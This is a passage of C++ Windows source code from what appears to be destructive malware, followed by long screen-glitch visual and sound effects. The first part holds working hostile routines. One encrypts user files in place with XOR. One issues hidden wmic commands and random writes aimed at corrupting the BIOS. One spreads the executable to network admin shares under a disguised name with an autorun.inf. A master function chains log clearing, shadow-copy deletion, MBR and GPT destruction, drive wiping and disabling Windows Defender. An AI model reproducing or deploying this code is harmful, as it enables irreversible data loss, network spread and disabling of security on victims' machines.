                                DWORD bytesRead;
                                
                                if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
                                    // Simple XOR encryption with a fixed key
                                    for (DWORD j = 0; j < fileSize; j++) {
                                        buffer[j] ^= 0xAA;
                                    }
                                    
                                    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                                    DWORD bytesWritten;
                                    WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);
                                }
                                
                                delete[] buffer;
                            }
                            CloseHandle(hFile);
                        }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    
    encryptionActive = true;
}

void CorruptBIOS() {
    if (!g_isAdmin) return;
    
    // Attempt to flash corrupted BIOS - this is highly dangerous and system-specific
    // This is a simplified version that attempts to access BIOS memory
    
    // Method 1: Attempt to write to BIOS through WMI
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    const wchar_t* biosCommands[] = {
        L"wmic bios set serialnumber=BROKEN4-CORRUPTED",
        L"wmic bios set version=BROKEN4-CORRUPTED",
        L"wmic /namespace:\\\\root\\wmi path setBIOSSettings /value:\"CORRUPTED\"",
        L"wmic /namespace:\\\\root\\wmi path setBIOSSetting /value:\"CORRUPTED\""
    };
    
    for (int i = 0; i < sizeof(biosCommands)/sizeof(biosCommands[0]); i++) {
        CreateProcessW(NULL, (LPWSTR)biosCommands[i], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    
    // Method 2: Attempt direct port I/O (will fail on most modern systems)
    __try {
        // Try to access BIOS memory directly (this will likely cause a crash)
        BYTE* biosMemory = (BYTE*)0xF0000;
        for (int i = 0; i < 65536; i++) {
            biosMemory[i] = static_cast<BYTE>(dis(gen));
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // Expected to fail on modern systems
    }
    
    biosCorruptionActive = true;
}

void PropagateNetwork() {
    // Attempt to propagate via network shares
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameW(computerName, &size);
    
    // Simple network propagation - copy to accessible shares
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    NETRESOURCEW nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpLocalName = NULL;
    nr.lpProvider = NULL;
    
    // Try common network shares
    const wchar_t* shares[] = {
        L"\\\\*\\ADMIN$", L"\\\\*\\C$", L"\\\\*\\D$", L"\\\\*\\IPC$",
        L"\\\\*\\PRINT$", L"\\\\*\\FAX$", L"\\\\*\\NETLOGON", L"\\\\*\\SYSVOL"
    };
    
    for (int i = 0; i < sizeof(shares)/sizeof(shares[0]); i++) {
        wchar_t targetShare[256];
        wsprintfW(targetShare, shares[i]);
        
        nr.lpRemoteName = targetShare;
        
        if (WNetAddConnection2W(&nr, NULL, NULL, 0) == NO_ERROR) {
            wchar_t destPath[256];
            wsprintfW(destPath, L"%s\\system32\\winlogon_helper.exe", targetShare);
            
            CopyFileW(szPath, destPath, FALSE);
            
            // Create autorun.inf
            wchar_t autorunPath[256];
            wsprintfW(autorunPath, L"%s\\autorun.inf", targetShare);
            
            HANDLE hFile = CreateFileW(autorunPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                const char* autorunContent = "[autorun]\nopen=winlogon_helper.exe\nshell\\open=Open\nshell\\open\\command=winlogon_helper.exe\nshell\\explore=Explorer\nshell\\explore\\command=winlogon_helper.exe";
                DWORD written;
                WriteFile(hFile, autorunContent, strlen(autorunContent), &written, NULL);
                CloseHandle(hFile);
            }
            
            WNetCancelConnection2W(targetShare, 0, TRUE);
        }
    }
    
    networkPropagationActive = true;
}

void ExecuteDestructiveActions() {
    if (destructiveActionsTriggered) return;
    destructiveActionsTriggered = true;

    // Privileged actions (admin only)
    if (g_isAdmin) {
        ClearEventLogs();
        ClearShadowCopies();
        CorruptBootFiles();
        CorruptKernelFiles();
        DestroyMBR();
        DestroyGPT();
        SetCustomBootFailure();
        WipeAllDrives();
        DisableWindowsDefender();
        EncryptUserFiles();
        CorruptBIOS();
        PropagateNetwork();
    }

    // Non-privileged actions
    WipeRemovableMedia();
}

// ======== ENHANCED VISUAL EFFECTS ========
void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 35;
        
        switch (soundType) {
        case 0: case 1: case 2: case 3:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 4: case 5:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 6: case 7:
            Beep(rand() % 4000 + 500, rand() % 100 + 30);
            break;
        case 8: case 9:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 5000 + 500, 15);
                Sleep(2);
            }
            break;
        case 10: case 11:
            Beep(rand() % 100 + 30, rand() % 400 + 200);
            break;
        case 12: case 13:
            for (int i = 0; i < 60; i++) {
                Beep(rand() % 4000 + 500, rand() % 30 + 10);
                Sleep(1);
            }
            break;
        case 14: case 15:
            for (int i = 0; i < 600; i += 3) {
                Beep(300 + i * 15, 8);
            }
            break;
        case 16: case 17:
            for (int i = 0; i < 20; i++) {
                Beep(50 + i * 100, 200);
            }
            break;
        case 18: case 19:
            // White noise
            for (int i = 0; i < 5000; i++) {
                Beep(rand() % 10000 + 500, 1);
            }
            break;
        case 20: case 21:
            // Rising pitch
            for (int i = 0; i < 1000; i++) {
                Beep(100 + i * 10, 1);
            }
            break;
        case 22: case 23:
            // Falling pitch
            for (int i = 0; i < 1000; i++) {
                Beep(10000 - i * 10, 1);
            }
            break;
        default:
            // Complex multi-tone
            for (int i = 0; i < 200; i++) {
                for (int j = 0; j < 3; j++) {
                    Beep(rand() % 6000 + 500, 10);
                }
                Sleep(5);
            }
            break;
        }
    }).detach();
}

void CaptureScreen(HWND) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 80 - 40) * intensityLevel;
    screenShakeY = (rand() % 80 - 40) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    int cursorSize = std::min(100 * intensityLevel, 1000);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[pos] = 255 - pPixels[pos];
                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
                    pPixels[pos + 2] = 255 - pPixels[pos + 2];
                    
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 20);
                        int shiftY = static_cast<int>(dy * amount * 20);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    // Add new particles
    if (particles.size() < MAX_PARTICLES && (rand() % 5 == 0)) {
        Particle p;
        p.x = rand() % screenWidth;
        p.y = rand() % screenHeight;
        p.vx = (rand() % 200 - 100) / 20.0f;
        p.vy = (rand() % 200 - 100) / 20.0f;
        p.life = 0;
        p.maxLife = 100 + rand() % 400;
        p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        p.size = 1 + rand() % 5;
        p.type = rand() % 5;
        p.rotation = 0;
        p.rotationSpeed = (rand() % 100 - 50) / 100.0f;
        
        std::lock_guard<std::mutex> lock(g_mutex);
        particles.push_back(p);
    }
    
    // Update existing particles
    std::lock_guard<std::mutex> lock(g_mutex);
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        it->rotation += it->rotationSpeed;
        
        // Apply gravity to some particles
        if (it->type == 1 || it->type == 3) {
            it->vy += 0.1f;
        }
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                // Different rendering based on particle type
                switch (it->type) {
                case 0: // Standard square
                    for (int py = -it->size; py <= it->size; py++) {
                        for (int px = -it->size; px <= it->size; px++) {
                            int pxPos = x + px;
                            int pyPos = y + py;
                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                int pos = (pyPos * screenWidth + pxPos) * 4;
                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                }
                            }
                        }
                    }
                    break;
                    
                case 1: // Circle
                    for (int py = -it->size; py <= it->size; py++) {
                        for (int px = -it->size; px <= it->size; px++) {
                            if (px*px + py*py <= it->size*it->size) {
                                int pxPos = x + px;
                                int pyPos = y + py;
                                if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                    int pos = (pyPos * screenWidth + pxPos) * 4;
                                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                        pPixels[pos] = GetBValue(it->color);
                                        pPixels[pos + 1] = GetGValue(it->color);
                                        pPixels[pos + 2] = GetRValue(it->color);
                                    }
                                }
                            }
                        }
                    }
                    break;
                    
                case 2: // Cross
                    for (int i = -it->size; i <= it->size; i++) {
                        int pxPos1 = x + i;
                        int pyPos1 = y;
                        if (pxPos1 >= 0 && pxPos1 < screenWidth && pyPos1 >= 0 && pyPos1 < screenHeight) {
                            int pos = (pyPos1 * screenWidth + pxPos1) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = GetBValue(it->color);
                                pPixels[pos + 1] = GetGValue(it->color);
                                pPixels[pos + 2] = GetRValue(it->color);
                            }
                        }
                        
                        int pxPos2 = x;
                        int pyPos2 = y + i;
                        if (pxPos2 >= 0 && pxPos2 < screenWidth && pyPos2 >= 0 && pyPos2 < screenHeight) {
                            int pos = (pyPos2 * screenWidth + pxPos2) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = GetBValue(it->color);
                                pPixels[pos + 1] = GetGValue(it->color);
                                pPixels[pos + 2] = GetRValue(it->color);
                            }
                        }
                    }
                    break;
                    
                case 3: // Rotating line
                    {
                        float cosr = cos(it->rotation);
                        float sinr = sin(it->rotation);
                        for (int i = -it->size; i <= it->size; i++) {
                            int px = static_cast<int>(i * cosr);
                            int py = static_cast<int>(i * sinr);
                            
                            int pxPos = x + px;
                            int pyPos = y + py;
                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                int pos = (pyPos * screenWidth + pxPos) * 4;
                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                }
                            }
                        }
                    }
                    break;
                    
                case 4: // Sparkle
                    if (rand() % 10 == 0) {
                        for (int py = -it->size; py <= it->size; py++) {
                            for (int px = -it->size; px <= it->size; px++) {
                                if (rand() % 3 == 0) {
                                    int pxPos = x + px;
                                    int pyPos = y + py;
                                    if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                        int pos = (pyPos * screenWidth + pxPos) * 4;
                                        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                            pPixels[pos] = GetBValue(it->color);
                                            pPixels[pos + 1] = GetGValue(it->color);
                                            pPixels[pos + 2] = GetRValue(it->color);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    break;
                }
            }
            ++it;
        }
    }
}

void ApplyMeltingEffect(BYTE* originalPixels) {
    int meltHeight = 100 + (rand() % 200) * intensityLevel;
    if (meltHeight < 20) meltHeight = 20;
    
    for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
        int meltAmount = (screenHeight - y) * 3;
        for (int x = 0; x < screenWidth; x++) {
            int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
            if (targetY < screenHeight && targetY >= 0) {
                int srcPos = (y * screenWidth + x) * 4;
                int dstPos = (targetY * screenWidth + x) * 4;
                
                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[dstPos] = originalPixels[srcPos];
                    pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
                }
            }
        }
    }
}

void ApplyTextCorruption() {
    if (!textCorruptionActive) return;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    if (rand() % 100 < 40) {
        CorruptedText ct;
        ct.x = rand() % (screenWidth - 300);
        ct.y = rand() % (screenHeight - 100);
        ct.creationTime = GetTickCount();
        ct.opacity = 0.8f + disf(gen) * 0.2f;
        ct.driftX = (disf(gen) - 0.5f) * 2.0f;
        ct.driftY = (disf(gen) - 0.5f) * 2.0f;
        
        int textLength = 15 + rand() % 40;
        for (int i = 0; i < textLength; i++) {
            wchar_t c;
            if (rand() % 6 == 0) {
                c = L'�';
            } else if (rand() % 10 == 0) {
                // Use some Unicode block elements
                wchar_t blocks[] = {L'█', L'░', L'▒', L'▓', L'▄', L'▀', L'■', L'□'};
                c = blocks[rand() % (sizeof(blocks)/sizeof(blocks[0]))];
            } else {
                c = static_cast<wchar_t>(0x20 + rand() % 95);
            }
            ct.text += c;
        }
        
        std::lock_guard<std::mutex> lock(g_mutex);
        if (corruptedTexts.size() < MAX_CORRUPTED_TEXTS) {
            corruptedTexts.push_back(ct);
        }
    }
    
    HFONT hFont = CreateFontW(
        28 + rand() % 30, 0, 0, 0, 
        FW_BOLD, 
        rand() % 2, rand() % 2, rand() % 2,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Terminal"
    );
    
    SelectObject(hdcMem, hFont);
    SetBkMode(hdcMem, TRANSPARENT);
    
    std::lock_guard<std::mutex> lock(g_mutex);
    for (auto it = corruptedTexts.begin(); it != corruptedTexts.end(); ) {
        it->x += static_cast<int>(it->driftX);
        it->y += static_cast<int>(it->driftY);
        
        // Wrap around screen edges
        if (it->x < -300) it->x = screenWidth;
        if (it->x > screenWidth) it->x = -300;
        if (it->y < -100) it->y = screenHeight;
        if (it->y > screenHeight) it->y = -100;
        
        COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
        SetTextColor(hdcMem, color);
        TextOutW(hdcMem, it->x, it->y, it->text.c_str(), static_cast<int>(it->text.length()));
        
        if (GetTickCount() - it->creationTime > 8000) {
            it = corruptedTexts.erase(it);
        } else {
            ++it;
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hFont);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyPixelSorting() {
    int startX = rand() % screenWidth;
    int startY = rand() % screenHeight;
    int width = 100 + rand() % 300;
    int height = 100 + rand() % 300;
    
    int endX = std::min(startX + width, screenWidth);
    int endY = std::min(startY + height, screenHeight);
    
    for (int y = startY; y < endY; y++) {
        std::vector<std::pair<float, int>> brightness;
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                brightness.push_back(std::make_pair(brt, x));
            }
        }
        
        std::sort(brightness.begin(), brightness.end());
        
        std::vector<BYTE> sortedLine;
        for (auto& b : brightness) {
            int pos = (y * screenWidth + b.second) * 4;
            sortedLine.push_back(pPixels[pos]);
            sortedLine.push_back(pPixels[pos+1]);
            sortedLine.push_back(pPixels[pos+2]);
            sortedLine.push_back(pPixels[pos+3]);
        }
        
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                int idx = (x - startX) * 4;
                pPixels[pos] = sortedLine[idx];
                pPixels[pos+1] = sortedLine[idx+1];
                pPixels[pos+2] = sortedLine[idx+2];
                pPixels[pos+3] = sortedLine[idx+3];
            }
        }
    }
}

void ApplyStaticBars() {
    int barCount = 10 + rand() % 20;
    int barHeight = 20 + rand() % 100;
    
    for (int i = 0; i < barCount; i++) {
        int barY = rand() % screenHeight;
        int barHeightActual = std::min(barHeight, screenHeight - barY);
        
        for (int y = barY; y < barY + barHeightActual; y++) {
            for (int x = 0; x < screenWidth; x++) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (rand() % 2 == 0) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos+1] = rand() % 256;
                        pPixels[pos+2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyInversionWaves() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int maxRadius = 200 + rand() % 800;
    float speed = 0.1f + (rand() % 100) / 100.0f;
    DWORD currentTime = GetTickCount();
    
    for (int y = 0; y < screenHeight; y++) {
        for (int x = 0; x < screenWidth; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float dist = sqrt(dx*dx + dy*dy);
            
            if (dist < maxRadius) {
                float wave = sin(dist * 0.05f - currentTime * 0.003f * speed) * 0.5f + 0.5f;
                if (wave > 0.6f) {
                    int pos = (y * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = 255 - pPixels[pos];
                        pPixels[pos+1] = 255 - pPixels[pos+1];
                        pPixels[pos+2] = 255 - pPixels[pos+2];
                    }
                }
            }
        }
    }
}

// ======== ADVANCED VISUAL EFFECTS ========
void ApplyMatrixRain() {
    if (!matrixRainActive) return;
    
    // Initialize matrix streams if empty
    if (matrixStreams.empty()) {
        for (int i = 0; i < screenWidth / 10; i++) {
            MatrixStream stream;
            stream.x = i * 10 + rand() % 10;
            stream.y = -rand() % 100;
            stream.length = 5 + rand() % 20;
            stream.speed = 1 + rand() % 5;
            stream.lastUpdate = GetTickCount();
            
            // Generate random symbols
            for (int j = 0; j < stream.length; j++) {
                if (rand() % 3 == 0) {
                    stream.symbols += static_cast<wchar_t>(0x30 + rand() % 10); // Numbers
                } else {
                    stream.symbols += static_cast<wchar_t>(0x30A0 + rand() % 96); // Japanese-like characters
                }
            }
            
            matrixStreams.push_back(stream);
        }
    }
    
    // Update and draw matrix streams
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    HFONT hFont = CreateFontW(
        14, 0, 0, 0, 
        FW_NORMAL, 
        FALSE, FALSE, FALSE,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Terminal"
    );
    
    SelectObject(hdcMem, hFont);
    SetBkMode(hdcMem, TRANSPARENT);
    
    DWORD currentTime = GetTickCount();
    
    for (auto& stream : matrixStreams) {
        if (currentTime - stream.lastUpdate > 1000 / stream.speed) {
            stream.y += stream.speed;
            stream.lastUpdate = currentTime;
            
            if (stream.y > screenHeight + stream.length * 20) {
                stream.y = -rand() % 100;
                stream.x = rand() % screenWidth;
            }
        }
        
        // Draw the stream
        for (int i = 0; i < stream.length; i++) {
            int yPos = stream.y - i * 20;
            if (yPos >= 0 && yPos < screenHeight) {
                // Fade color from bright green to dark green
                int green = 255 - (i * 255 / stream.length);
                COLORREF color = RGB(0, green, 0);
                SetTextColor(hdcMem, color);
                
                wchar_t symbol[2] = {stream.symbols[i], 0};
                TextOutW(hdcMem, stream.x, yPos, symbol, 1);
            }
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hFont);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyFractalNoise() {
    if (!fractalNoiseActive) return;
    
    // Initialize fractal points if empty
    if (fractalPoints.empty()) {
        for (int i = 0; i < 1000; i++) {
            FractalPoint point;
            point.x = disf(gen) * screenWidth;
            point.y = disf(gen) * screenHeight;
            point.vx = (disf(gen) - 0.5f) * 5.0f;
            point.vy = (disf(gen) - 0.5f) * 5.0f;
            point.color = RGB(dis(gen), dis(gen), dis(gen));
            fractalPoints.push_back(point);
        }
    }
    
    // Update and draw fractal points
    for (auto& point : fractalPoints) {
        point.x += point.vx;
        point.y += point.vy;
        
        // Bounce off edges
        if (point.x < 0 || point.x >= screenWidth) point.vx = -point.vx;
        if (point.y < 0 || point.y >= screenHeight) point.vy = -point.vy;
        
        // Draw influence area
        int radius = 10 + intensityLevel * 2;
        for (int y = -radius; y <= radius; y++) {
            for (int x = -radius; x <= radius; x++) {
                int px = static_cast<int>(point.x) + x;
                int py = static_cast<int>(point.y) + y;
                
                if (px >= 0 && px < screenWidth && py >= 0 && py < screenHeight) {
                    float dist = sqrt(x*x + y*y);
                    if (dist <= radius) {
                        float influence = 1.0f - (dist / radius);
                        int pos = (py * screenWidth + px) * 4;
                        
                        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                            pPixels[pos] = static_cast<BYTE>(pPixels[pos] * (1.0f - influence) + GetBValue(point.color) * influence);
                            pPixels[pos+1] = static_cast<BYTE>(pPixels[pos+1] * (1.0f - influence) + GetGValue(point.color) * influence);
                            pPixels[pos+2] = static_cast<BYTE>(pPixels[pos+2] * (1.0f - influence) + GetRValue(point.color) * influence);
                        }
                    }
                }
            }
        }
    }
}

void ApplyScreenBurn() {
    if (!screenBurnActive) return;
    
    static DWORD lastBurnTime = 0;
    DWORD currentTime = GetTickCount();
    
    if (currentTime - lastBurnTime > 100) {
        lastBurnTime = currentTime;
        
        // Create burn-in effect by slightly darkening the entire screen
        for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = std::max(0, pPixels[i] - 1);
                pPixels[i+1] = std::max(0, pPixels[i+1] - 1);
                pPixels[i+2] = std::max(0, pPixels[i+2] - 1);
            }
        }
        
        // Add random burn spots
        for (int i = 0; i < intensityLevel * 10; i++) {
            int x = rand() % screenWidth;
            int y = rand() % screenHeight;
            int radius = 5 + rand() % (intensityLevel * 5);
            
            for (int py = -radius; py <= radius; py++) {
                for (int px = -radius; px <= radius; px++) {
                    if (px*px + py*py <= radius*radius) {
                        int pxPos = x + px;
                        int pyPos = y + py;
                        
                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                            int pos = (pyPos * screenWidth + pxPos) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = std::max(0, pPixels[pos] - 10);
                                pPixels[pos+1] = std::max(0, pPixels[pos+1] - 10);
                                pPixels[pos+2] = std::max(0, pPixels[pos+2] - 10);
                            }
                        }
                    }
                }
            }
        }
    }
}

void ApplyWormholeEffect() {
    if (!wormholeEffectActive) return;
    
    // Create new wormholes occasionally
    if (wormholes.size() < 5 && rand() % 100 == 0) {
        Wormhole hole;
        hole.centerX = disf(gen) * screenWidth;
        hole.centerY = disf(gen) * screenHeight;
        hole.radius = 50 + disf(gen) * 100;
        hole.strength = 0.5f + disf(gen) * 2.0f;
        hole.creationTime = GetTickCount();
        wormholes.push_back(hole);
    }
    
    // Apply wormhole distortion
    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
    if (!pCopy) return;
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    for (auto& hole : wormholes) {
        for (int y = 0; y < screenHeight; y++) {
            for (int x = 0; x < screenWidth; x++) {
                float dx = static_cast<float>(x - hole.centerX);
                float dy = static_cast<float>(y - hole.centerY);
                float dist = sqrt(dx*dx + dy*dy);
                
                if (dist < hole.radius) {
                    float amount = pow(1.0f - (dist / hole.radius), 2.0f) * hole.strength;
                    int shiftX = static_cast<int>(dx * amount);
                    int shiftY = static_cast<int>(dy * amount);
                    
                    int srcX = x - shiftX;
                    int srcY = y - shiftY;
                    
                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                        int srcPos = (srcY * screenWidth + srcX) * 4;
                        int dstPos = (y * screenWidth + x) * 4;
                        
                        if (dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                            pPixels[dstPos] = pCopy[srcPos];
                            pPixels[dstPos + 1] = pCopy[srcPos + 1];
                            pPixels[dstPos + 2] = pCopy[srcPos + 2];
                        }
                    }
                }
            }
        }
    }
    
    // Remove old wormholes
    DWORD currentTime = GetTickCount();
    for (auto it = wormholes.begin(); it != wormholes.end(); ) {
        if (currentTime - it->creationTime > 10000) {
            it = wormholes.erase(it);
        } else {
            ++it;
        }
    }
    
    delete[] pCopy;
}

void ApplyTemporalDistortion() {
    if (!temporalDistortionActive) return;
    
    static std::vector<std::vector<BYTE>> frameHistory;
    static int historyIndex = 0;
    
    // Initialize frame history
    if (frameHistory.empty()) {
        frameHistory.resize(10);
        for (auto& frame : frameHistory) {
            frame.resize(screenWidth * screenHeight * 4);
        }
    }
    
    // Store current frame
    memcpy(frameHistory[historyIndex].data(), pPixels, screenWidth * screenHeight * 4);
